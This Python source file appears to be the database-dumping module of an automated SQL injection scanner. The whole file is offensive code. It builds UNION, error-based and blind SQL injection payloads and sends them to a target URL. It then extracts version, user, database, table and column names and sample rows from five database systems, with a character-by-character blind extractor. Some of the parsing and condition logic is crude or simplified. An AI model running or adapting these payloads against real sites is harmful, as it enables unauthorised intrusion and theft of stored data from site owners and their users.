"""
Automatic Database Dumper Module
Extract database information when SQL injection vulnerability is confirmed
"""

import time
import logging
import re
from urllib.parse import urlencode, parse_qs, urlparse

logger = logging.getLogger('sqli_scanner')

class DatabaseDumper:
    """Automatically dump database information from confirmed SQL injection"""
    
    def __init__(self, session, delay=1.0, timeout=10):
        self.session = session
        self.delay = delay
        self.timeout = timeout
        self.extracted_data = {}
    
    def dump_database(self, url, parameter, method, dbms, injection_type):
        """Main database dumping function"""
        logger.info(f"Starting database dump for {dbms} via {injection_type}")
        
        dumper_map = {
            'mysql': self._dump_mysql,
            'mssql': self._dump_mssql,
            'oracle': self._dump_oracle,
            'postgresql': self._dump_postgresql,
            'sqlite': self._dump_sqlite
        }
        
        dumper_func = dumper_map.get(dbms.lower(), self._dump_generic)
        return dumper_func(url, parameter, method, injection_type)
    
    def _dump_mysql(self, url, parameter, method, injection_type):
        """Dump MySQL database information"""
        logger.info("Dumping MySQL database information")
        
        dump_data = {
            'dbms': 'mysql',
            'version': None,
            'current_user': None,
            'current_database': None,
            'databases': [],
            'tables': {},
            'columns': {},
            'data': {}
        }
        
        try:
            # Extract version
            version_payload = self._build_union_payload("SELECT VERSION()", injection_type, 1)
            version = self._extract_data(url, parameter, method, version_payload)
            if version:
                dump_data['version'] = version
                logger.info(f"MySQL Version: {version}")
            
            # Extract current user
            user_payload = self._build_union_payload("SELECT USER()", injection_type, 1)
            user = self._extract_data(url, parameter, method, user_payload)
            if user:
                dump_data['current_user'] = user
                logger.info(f"Current User: {user}")
            
            # Extract current database
            db_payload = self._build_union_payload("SELECT DATABASE()", injection_type, 1)
            current_db = self._extract_data(url, parameter, method, db_payload)
            if current_db:
                dump_data['current_database'] = current_db
                logger.info(f"Current Database: {current_db}")
            
            # Extract database names
            databases_payload = self._build_union_payload(
                "SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata", 
                injection_type, 1
            )
            databases = self._extract_data(url, parameter, method, databases_payload)
            if databases:
                dump_data['databases'] = [db.strip() for db in databases.split(',')]
                logger.info(f"Databases found: {len(dump_data['databases'])}")
            
            # Extract table names for current database
            if current_db:
                tables_payload = self._build_union_payload(
                    f"SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema='{current_db}'",
                    injection_type, 1
                )
                tables = self._extract_data(url, parameter, method, tables_payload)
                if tables:
                    table_list = [table.strip() for table in tables.split(',')]
                    dump_data['tables'][current_db] = table_list
                    logger.info(f"Tables in {current_db}: {len(table_list)}")
                    
                    # Extract columns for each table (limit to first 5 tables)
                    for table in table_list[:5]:
                        columns_payload = self._build_union_payload(
                            f"SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_schema='{current_db}' AND table_name='{table}'",
                            injection_type, 1
                        )
                        columns = self._extract_data(url, parameter, method, columns_payload)
                        if columns:
                            column_list = [col.strip() for col in columns.split(',')]
                            dump_data['columns'][table] = column_list
                            logger.info(f"Columns in {table}: {len(column_list)}")
                            
                            # Extract sample data (first 3 rows)
                            if column_list:
                                data_payload = self._build_union_payload(
                                    f"SELECT GROUP_CONCAT({','.join(column_list[:3])}) FROM {current_db}.{table} LIMIT 3",
                                    injection_type, 1
                                )
                                sample_data = self._extract_data(url, parameter, method, data_payload)
                                if sample_data:
                                    dump_data['data'][table] = sample_data
                                    logger.info(f"Sample data extracted from {table}")
        
        except Exception as e:
            logger.error(f"MySQL dump failed: {str(e)}")
        
        return dump_data
    
    def _dump_mssql(self, url, parameter, method, injection_type):
        """Dump MSSQL database information"""
        logger.info("Dumping MSSQL database information")
        
        dump_data = {
            'dbms': 'mssql',
            'version': None,
            'current_user': None,
            'current_database': None,
            'databases': [],
            'tables': {},
            'columns': {},
            'data': {}
        }
        
        try:
            # Extract version
            version_payload = self._build_union_payload("SELECT @@VERSION", injection_type, 1)
            version = self._extract_data(url, parameter, method, version_payload)
            if version:
                dump_data['version'] = version
                logger.info(f"MSSQL Version: {version}")
            
            # Extract current user
            user_payload = self._build_union_payload("SELECT USER_NAME()", injection_type, 1)
            user = self._extract_data(url, parameter, method, user_payload)
            if user:
                dump_data['current_user'] = user
                logger.info(f"Current User: {user}")
            
            # Extract current database
            db_payload = self._build_union_payload("SELECT DB_NAME()", injection_type, 1)
            current_db = self._extract_data(url, parameter, method, db_payload)
            if current_db:
                dump_data['current_database'] = current_db
                logger.info(f"Current Database: {current_db}")
            
            # Extract database names
            databases_payload = self._build_union_payload(
                "SELECT name FROM sys.databases", 
                injection_type, 1
            )
            databases = self._extract_data(url, parameter, method, databases_payload)
            if databases:
                dump_data['databases'] = [databases]  # Single result for MSSQL
                logger.info(f"Database found: {databases}")
            
            # Extract table names
            if current_db:
                tables_payload = self._build_union_payload(
                    "SELECT name FROM sysobjects WHERE xtype='U'",
                    injection_type, 1
                )
                tables = self._extract_data(url, parameter, method, tables_payload)
                if tables:
                    dump_data['tables'][current_db] = [tables]
                    logger.info(f"Table found: {tables}")
        
        except Exception as e:
            logger.error(f"MSSQL dump failed: {str(e)}")
        
        return dump_data
    
    def _dump_oracle(self, url, parameter, method, injection_type):
        """Dump Oracle database information"""
        logger.info("Dumping Oracle database information")
        
        dump_data = {
            'dbms': 'oracle',
            'version': None,
            'current_user': None,
            'current_database': None,
            'databases': [],
            'tables': {},
            'columns': {},
            'data': {}
        }
        
        try:
            # Extract version
            version_payload = self._build_union_payload("SELECT banner FROM v$version WHERE rownum=1", injection_type, 1)
            version = self._extract_data(url, parameter, method, version_payload)
            if version:
                dump_data['version'] = version
                logger.info(f"Oracle Version: {version}")
            
            # Extract current user
            user_payload = self._build_union_payload("SELECT user FROM dual", injection_type, 1)
            user = self._extract_data(url, parameter, method, user_payload)
            if user:
                dump_data['current_user'] = user
                logger.info(f"Current User: {user}")
            
            # Extract table names
            tables_payload = self._build_union_payload(
                "SELECT table_name FROM all_tables WHERE rownum<=10",
                injection_type, 1
            )
            tables = self._extract_data(url, parameter, method, tables_payload)
            if tables:
                dump_data['tables']['oracle'] = [tables]
                logger.info(f"Table found: {tables}")
        
        except Exception as e:
            logger.error(f"Oracle dump failed: {str(e)}")
        
        return dump_data
    
    def _dump_postgresql(self, url, parameter, method, injection_type):
        """Dump PostgreSQL database information"""
        logger.info("Dumping PostgreSQL database information")
        
        dump_data = {
            'dbms': 'postgresql',
            'version': None,
            'current_user': None,
            'current_database': None,
            'databases': [],
            'tables': {},
            'columns': {},
            'data': {}
        }
        
        try:
            # Extract version
            version_payload = self._build_union_payload("SELECT version()", injection_type, 1)
            version = self._extract_data(url, parameter, method, version_payload)
            if version:
                dump_data['version'] = version
                logger.info(f"PostgreSQL Version: {version}")
            
            # Extract current user
            user_payload = self._build_union_payload("SELECT current_user", injection_type, 1)
            user = self._extract_data(url, parameter, method, user_payload)
            if user:
                dump_data['current_user'] = user
                logger.info(f"Current User: {user}")
            
            # Extract current database
            db_payload = self._build_union_payload("SELECT current_database()", injection_type, 1)
            current_db = self._extract_data(url, parameter, method, db_payload)
            if current_db:
                dump_data['current_database'] = current_db
                logger.info(f"Current Database: {current_db}")
            
            # Extract table names
            tables_payload = self._build_union_payload(
                "SELECT string_agg(tablename, ',') FROM pg_tables WHERE schemaname='public'",
                injection_type, 1
            )
            tables = self._extract_data(url, parameter, method, tables_payload)
            if tables:
                table_list = [table.strip() for table in tables.split(',')]
                dump_data['tables'][current_db or 'public'] = table_list
                logger.info(f"Tables found: {len(table_list)}")
        
        except Exception as e:
            logger.error(f"PostgreSQL dump failed: {str(e)}")
        
        return dump_data
    
    def _dump_sqlite(self, url, parameter, method, injection_type):
        """Dump SQLite database information"""
        logger.info("Dumping SQLite database information")
        
        dump_data = {
            'dbms': 'sqlite',
            'version': None,
            'current_user': None,
            'current_database': None,
            'databases': [],
            'tables': {},
            'columns': {},
            'data': {}
        }
        
        try:
            # Extract version
            version_payload = self._build_union_payload("SELECT sqlite_version()", injection_type, 1)
            version = self._extract_data(url, parameter, method, version_payload)
            if version:
                dump_data['version'] = version
                logger.info(f"SQLite Version: {version}")
            
            # Extract table names
            tables_payload = self._build_union_payload(
                "SELECT group_concat(name) FROM sqlite_master WHERE type='table'",
                injection_type, 1
            )
            tables = self._extract_data(url, parameter, method, tables_payload)
            if tables:
                table_list = [table.strip() for table in tables.split(',')]
                dump_data['tables']['main'] = table_list
                logger.info(f"Tables found: {len(table_list)}")
        
        except Exception as e:
            logger.error(f"SQLite dump failed: {str(e)}")
        
        return dump_data
    
    def _dump_generic(self, url, parameter, method, injection_type):
        """Generic database dump for unknown DBMS"""
        logger.info("Attempting generic database dump")
        
        dump_data = {
            'dbms': 'unknown',
            'version': None,
            'current_user': None,
            'current_database': None,
            'databases': [],
            'tables': {},
            'columns': {},
            'data': {}
        }
        
        # Try common version extraction methods
        version_queries = [
            "SELECT @@VERSION",
            "SELECT VERSION()",
            "SELECT sqlite_version()",
            "SELECT banner FROM v$version WHERE rownum=1"
        ]
        
        for query in version_queries:
            try:
                version_payload = self._build_union_payload(query, injection_type, 1)
                version = self._extract_data(url, parameter, method, version_payload)
                if version:
                    dump_data['version'] = version
                    logger.info(f"Version found: {version}")
                    break
            except:
                continue
        
        return dump_data
    
    def _build_union_payload(self, query, injection_type, column_count=1):
        """Build UNION payload for data extraction"""
        if injection_type == 'union_based':
            # Build UNION SELECT payload
            null_columns = ','.join(['NULL'] * (column_count - 1))
            if null_columns:
                return f"' UNION SELECT ({query}),{null_columns}--"
            else:
                return f"' UNION SELECT ({query})--"
        
        elif injection_type == 'error_based':
            # Use error-based extraction techniques
            return f"' AND EXTRACTVALUE(1, CONCAT(0x7e, ({query}), 0x7e))--"
        
        elif injection_type == 'boolean_blind':
            # For boolean blind, we'd need to implement character-by-character extraction
            # This is a simplified version
            return f"' AND LENGTH(({query}))>0--"
        
        else:
            # Generic approach
            return f"' UNION SELECT ({query})--"
    
    def _extract_data(self, url, parameter, method, payload):
        """Extract data using the given payload"""
        try:
            if method.upper() == 'GET':
                response = self._send_get_request(url, parameter, payload)
            else:
                response = self._send_post_request(url, parameter, payload)
            
            # Extract data from response
            extracted = self._parse_extracted_data(response.text)
            
            time.sleep(self.delay)
            return extracted
        
        except Exception as e:
            logger.debug(f"Data extraction failed: {str(e)}")
            return None
    
    def _send_get_request(self, url, param, payload):
        """Send GET request with payload"""
        parsed_url = urlparse(url)
        params = parse_qs(parsed_url.query)
        params[param] = [payload]
        
        new_query = urlencode(params, doseq=True)
        test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{new_query}"
        
        return self.session.get(test_url, timeout=self.timeout)
    
    def _send_post_request(self, url, param, payload):
        """Send POST request with payload"""
        data = {param: payload}
        return self.session.post(url, data=data, timeout=self.timeout)
    
    def _parse_extracted_data(self, response_text):
        """Parse extracted data from response"""
        # Look for common data patterns
        patterns = [
            r'([0-9]+\.[0-9]+\.[0-9]+[-\w]*)',  # Version numbers
            r'([a-zA-Z_][a-zA-Z0-9_]*@[a-zA-Z0-9_]+)',  # User@host
            r'([a-zA-Z_][a-zA-Z0-9_]{2,})',  # Database/table names
        ]
        
        for pattern in patterns:
            matches = re.findall(pattern, response_text)
            if matches:
                # Return the first meaningful match
                for match in matches:
                    if len(match) > 2 and not match.isdigit():
                        return match
        
        return None

class BlindDataExtractor:
    """Extract data using blind SQL injection techniques"""
    
    def __init__(self, session, delay=1.0, timeout=10):
        self.session = session
        self.delay = delay
        self.timeout = timeout
    
    def extract_string_blind(self, url, parameter, method, query, max_length=100):
        """Extract string data using boolean-based blind injection"""
        logger.info(f"Extracting data via blind injection: {query}")
        
        result = ""
        
        for position in range(1, max_length + 1):
            # Binary search for character at position
            low, high = 32, 126  # ASCII printable range
            
            while low <= high:
                mid = (low + high) // 2
                
                # Test if character at position is greater than mid
                test_payload = f"' AND ASCII(SUBSTRING(({query}),{position},1))>{mid}--"
                
                try:
                    if self._test_condition(url, parameter, method, test_payload):
                        low = mid + 1
                    else:
                        high = mid - 1
                    
                    time.sleep(self.delay)
                
                except Exception as e:
                    logger.debug(f"Blind extraction error: {str(e)}")
                    break
            
            if low > 126:  # End of string
                break
            
            if low >= 32:  # Valid ASCII character
                result += chr(low)
                logger.debug(f"Extracted character {position}: {chr(low)}")
            else:
                break
        
        logger.info(f"Blind extraction result: {result}")
        return result if result else None
    
    def _test_condition(self, url, parameter, method, payload):
        """Test if a condition is true using blind injection"""
        try:
            if method.upper() == 'GET':
                response = self._send_get_request(url, parameter, payload)
            else:
                response = self._send_post_request(url, parameter, payload)
            
            # This is a simplified condition test
            # In practice, you'd need to compare with baseline responses
            # to determine if the condition was true or false
            return len(response.content) > 1000  # Simplified condition
        
        except Exception:
            return False
    
    def _send_get_request(self, url, param, payload):
        """Send GET request with payload"""
        parsed_url = urlparse(url)
        params = parse_qs(parsed_url.query)
        params[param] = [payload]
        
        new_query = urlencode(params, doseq=True)
        test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{new_query}"
        
        return self.session.get(test_url, timeout=self.timeout)
    
    def _send_post_request(self, url, param, payload):
        """Send POST request with payload"""
        data = {param: payload}
        return self.session.post(url, data=data, timeout=self.timeout)

class DataFormatter:
    """Format extracted database data for output"""
    
    @staticmethod
    def format_dump_data(dump_data):
        """Format dump data for display"""
        formatted = []
        
        formatted.append("=" * 60)
        formatted.append("DATABASE DUMP RESULTS")
        formatted.append("=" * 60)
        
        # Basic information
        if dump_data.get('dbms'):
            formatted.append(f"DBMS: {dump_data['dbms'].upper()}")
        
        if dump_data.get('version'):
            formatted.append(f"Version: {dump_data['version']}")
        
        if dump_data.get('current_user'):
            formatted.append(f"Current User: {dump_data['current_user']}")
        
        if dump_data.get('current_database'):
            formatted.append(f"Current Database: {dump_data['current_database']}")
        
        formatted.append("")
        
        # Databases
        if dump_data.get('databases'):
            formatted.append("DATABASES:")
            for db in dump_data['databases']:
                formatted.append(f"  - {db}")
            formatted.append("")
        
        # Tables
        if dump_data.get('tables'):
            formatted.append("TABLES:")
            for db, tables in dump_data['tables'].items():
                formatted.append(f"  Database: {db}")
                for table in tables:
                    formatted.append(f"    - {table}")
            formatted.append("")
        
        # Columns
        if dump_data.get('columns'):
            formatted.append("COLUMNS:")
            for table, columns in dump_data['columns'].items():
                formatted.append(f"  Table: {table}")
                for column in columns:
                    formatted.append(f"    - {column}")
            formatted.append("")
        
        # Sample data
        if dump_data.get('data'):
            formatted.append("SAMPLE DATA:")
            for table, data in dump_data['data'].items():
                formatted.append(f"  Table: {table}")
                formatted.append(f"    Data: {data}")
            formatted.append("")
        
        formatted.append("=" * 60)
        
        return "\n".join(formatted)
    
    @staticmethod
    def format_as_json(dump_data):
        """Format dump data as JSON"""
        import json
        return json.dumps(dump_data, indent=2, ensure_ascii=False)
    
    @staticmethod
    def format_as_csv(dump_data):
        """Format dump data as CSV"""
        csv_lines = []
        
        # Header
        csv_lines.append("Type,Database,Table,Column,Data")
        
        # Basic info
        if dump_data.get('version'):
            csv_lines.append(f"Version,,,{dump_data['version']}")
        
        if dump_data.get('current_user'):
            csv_lines.append(f"User,,,{dump_data['current_user']}")
        
        # Databases
        for db in dump_data.get('databases', []):
            csv_lines.append(f"Database,{db},,")
        
        # Tables
        for db, tables in dump_data.get('tables', {}).items():
            for table in tables:
                csv_lines.append(f"Table,{db},{table},")
        
        # Columns
        for table, columns in dump_data.get('columns', {}).items():
            for column in columns:
                csv_lines.append(f"Column,,{table},{column}")
        
        return "\n".join(csv_lines)
